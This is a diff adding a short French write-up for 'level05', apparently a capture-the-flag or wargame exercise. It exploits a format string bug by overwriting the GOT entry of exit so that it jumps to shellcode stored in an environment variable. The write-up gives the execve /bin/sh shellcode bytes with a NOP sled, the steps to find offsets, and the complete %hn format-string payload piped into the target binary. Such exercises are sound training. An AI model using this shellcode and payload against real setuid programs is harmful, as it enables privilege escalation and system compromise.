@@ -1,0 +1,16 @@
+Il y a un format string bug evidant de plus on a une exit en fin de programme. On va donc utiliser la methode got.
+Il faut ecrire l'adresse d'un shellcode present dans l'environnement à l'adresse GOT d'exit.
+objdump -R level05
+GOT exit = 0x080497e0
+export SHELLCODE=$(python -c "print '\x90'*10000 + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
+On copy notre main.c dans /tmp pour recuperer l'adresse de notre shellcode
+cd /tmp && gcc main.c && ./a.out && cd
+On obtient 0xffffc1d5 et on ajoute 5000 : 0xffffd55d
+Il faudra ecrire l'adresse du shellcode (0xffffd55d) a l'emplacement du GOT d'exit (0x080497e0)
+Grace a la commande suivante :
+python -c "print 'b'*4 + '%p.'*100" | ./level05
+On remarque que notre buffer commence a la 10eme position. On utilise un b minuscule (62) car un traitement est fait pour modifier les characteres ascii inferieur a 90.
+Il va falloir ecrire l'adresse du shellcode en deux fois grace a hn. On va d'abord ecrire ffff puis d55d.
+Sur 0x080497e0 on va ecrire d55d et sur 0x080497e2 on va ecrire ffff ce qui nous donne :
+python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%54613x" + "%10$hn" + "%10914x" + "%11$hn"' > /tmp/level05 && cat /tmp/level05 - | ./level05
+54613 + 8 = d55d et d55d + 10914 = ffff. On a donc ecrire 0xffffd55d a l'adresse 0x080497e0.
